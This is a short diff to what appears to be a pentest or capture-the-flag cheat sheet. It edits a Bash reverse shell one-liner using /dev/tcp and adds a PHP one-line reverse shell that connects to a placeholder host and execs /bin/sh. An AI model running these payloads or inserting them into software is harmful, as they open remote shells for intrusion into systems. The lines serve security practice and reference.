@@ -13,4 +13,8 @@
 ### Bash
 
 1. Maintain shell after running an exploiting: `(./exploit | cat ) | ./vuln`
-2. Simple Bash revshell: `bash -i >& /dev/tcp/{host_ip}/{port} 0>&1`
+2. Simple Bash revshell: `bash -i >& /dev/tcp/{HOST_IP}/{PORT} 0>&1`
+
+### PHP
+
+1. Oneline revshell: `php -r '$sock=fsockopen("{HOST_IP}",80);exec("/bin/sh -i <&3 >&3 2>&3");'`
